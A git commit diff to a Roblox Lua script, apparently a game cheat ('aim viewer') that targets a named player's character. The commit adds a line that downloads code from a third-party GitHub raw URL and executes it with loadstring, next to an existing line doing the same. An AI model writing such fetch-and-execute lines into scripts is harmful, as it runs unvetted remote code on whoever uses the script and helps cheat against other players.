cdf6b6874dffaed3050c107f399d7c16d9471a6e
sygzxW <73584462+sygzxW@users.noreply.github.com>
2022-12-20 19:46:21 +0100

    Update balls.lua

--- balls.lua
+++ balls.lua
@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/aim-viewer/main/aim%20viewer"))()
+local aa = "https://raw.githubusercontent.com/reallykaren/linkup/main/linkv2"
+loadstring(game:HttpGet(aa))()
 local char = game:GetService("Players").KubsoniX_PL.Character
 local lp = game:GetService("Players").LocalPlayer.Character
 
